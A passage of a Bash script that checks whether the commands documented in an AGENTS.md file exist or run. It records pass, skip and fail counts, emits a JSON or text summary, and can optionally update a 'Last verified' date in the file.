                    ((FAILED+=1))
                fi
                return 0
            fi
            # Check if command exists in PATH
            if command -v "$base_cmd" > /dev/null 2>&1; then
                if [ "$SMOKE_TEST" = true ]; then
                    if smoke_test_command "$cmd"; then
                        local duration="${COMMAND_RESULTS[$cmd]}"
                        duration=$(echo "$duration" | grep -oE '"duration_ms": [0-9]+' | cut -d: -f2 | tr -d ' ')
                        success "command works (~${duration}ms)"
                        ((PASSED+=1))
                    else
                        warn "command exists but failed: $cmd"
                        ((SKIPPED+=1))
                    fi
                else
                    success "command exists: $base_cmd"
                    COMMAND_RESULTS["$cmd"]='{"exists": true}'
                    ((PASSED+=1))
                fi
            else
                warn "command not in PATH: $base_cmd"
                COMMAND_RESULTS["$cmd"]='{"exists": false}'
                ((SKIPPED+=1))
            fi
            ;;
    esac
}

# The inventory: every documented command once, with where it was found.
mapfile -t entries < <(extract_commands | LC_ALL=C sort -t $'\t' -k2)
INVENTORY_JSON="$(printf '%s\n' "${entries[@]}" | jq -Rsc '
    split("\n") | map(select(length > 0) | split("\t") | {source: .[0], cmd: (.[1:] | join("\t"))})')"

# An empty inventory is not a verified one: nothing was checked.
if [ ${#entries[@]} -eq 0 ]; then
    warn "No commands found in AGENTS.md: nothing was verified"
    if [[ "$JSON" = true ]]; then
        jq -nc --argjson p "$PASSED" --argjson s "$SKIPPED" --argjson f "$FAILED" \
            '{script:"verify-commands",schema:1,status:"empty",found:0,summary:{passed:$p,skipped:$s,failed:$f},inventory:[],commands:[]}' >&3
    fi
    [ "$ALLOW_EMPTY" = true ] && exit 0
    exit 3
fi

echo "Found ${#entries[@]} unique commands to verify"
echo ""

# A command taken only from a fenced block is an example: check that it
# exists, never run it.
for entry in "${entries[@]}"; do
    cmd="${entry#*$'\t'}"
    [ -n "$cmd" ] || continue
    if [ "${entry%%$'\t'*}" = fenced ]; then
        SMOKE_TEST_SAVED="$SMOKE_TEST"
        SMOKE_TEST=false
        verify_command "$cmd"
        SMOKE_TEST="$SMOKE_TEST_SAVED"
    else
        verify_command "$cmd"
    fi
done

if [ "$FAILED" -gt 0 ]; then
    STATUS=failed
elif [ "$PASSED" -gt 0 ]; then
    STATUS=verified
else
    STATUS=unverified
fi

# Emit JSON document (machine-readable) and exit before the human summary.
# Summary counts come from the authoritative PASSED/SKIPPED/FAILED counters; the
# commands[] array is built best-effort from COMMAND_RESULTS (iterating its keys,
# parsing each stored value as JSON, else null).
if [[ "$JSON" = true ]]; then
    if [[ "${#COMMAND_RESULTS[@]}" -gt 0 ]]; then
        # Iterate keys in SORTED order: associative-array key order is otherwise
        # unspecified in Bash, which would make commands[] order vary run to run.
        # read -r (not word-split) preserves command strings that contain spaces.
        while IFS= read -r cmd; do
            stored="${COMMAND_RESULTS[$cmd]}"
            if entry=$(jq -nc --arg cmd "$cmd" --argjson detail "$stored" \
                '{cmd:$cmd,detail:$detail}' 2>/dev/null); then
                JSON_CMDS+=("$entry")
            else
                JSON_CMDS+=("$(jq -nc --arg cmd "$cmd" '{cmd:$cmd,detail:null}')")
            fi
        done < <(printf '%s\n' "${!COMMAND_RESULTS[@]}" | LC_ALL=C sort)
    fi

    if [[ "${#JSON_CMDS[@]}" -eq 0 ]]; then
        arr_json='[]'
    else
        arr_json=$(printf '%s\n' "${JSON_CMDS[@]}" | jq -s '.')
    fi

    jq -nc \
        --argjson items "$arr_json" \
        --argjson inv "$INVENTORY_JSON" \
        --arg status "$STATUS" \
        --argjson p "$PASSED" \
        --argjson s "$SKIPPED" \
        --argjson f "$FAILED" \
        '{script:"verify-commands",schema:1,status:$status,found:($inv | length),summary:{passed:$p,skipped:$s,failed:$f},inventory:$inv,commands:$items}' >&3

    if [[ "$FAILED" -gt 0 ]]; then exit 1; fi
    exit 0
fi

echo ""
echo "======================================"
echo "Verification Summary"
echo "======================================"
echo -e "${GREEN}Passed:${NC}  $PASSED"
echo -e "${YELLOW}Skipped:${NC} $SKIPPED"
echo -e "${RED}Failed:${NC}  $FAILED"
echo ""

if [ "$FAILED" -gt 0 ]; then
    echo -e "${RED}Some commands in AGENTS.md are invalid!${NC}"
    echo "Update AGENTS.md to fix broken command references."

    # Still write JSON results
    if [ "$DRY_RUN" = false ] && [ ${#COMMAND_RESULTS[@]} -gt 0 ]; then
        write_json_results
    fi

    exit 1
else
    echo -e "${GREEN}All verifiable commands are valid.${NC}"

    # Write JSON results
    if [ "$DRY_RUN" = false ] && [ ${#COMMAND_RESULTS[@]} -gt 0 ]; then
        write_json_results
        [ "$SIDECAR_WRITABLE" = true ] && echo "Verification results saved to $OUTPUT_JSON"
    fi

    # A verification run changes the file it checks only when asked to.
    if [ "$DRY_RUN" = false ] && [ "$UPDATE_VERIFIED" = true ] && [ -w "$AGENTS_FILE" ]; then
        TODAY=$(date +%Y-%m-%d)
        if grep -q "Last verified:" "$AGENTS_FILE"; then
            # Portable sed -i: use backup extension then remove backup
            sed -i.bak "s/Last verified: .*/Last verified: $TODAY -->/" "$AGENTS_FILE" && rm -f "$AGENTS_FILE.bak"
            echo "Updated 'Last verified' timestamp to $TODAY"
        fi
    fi
fi
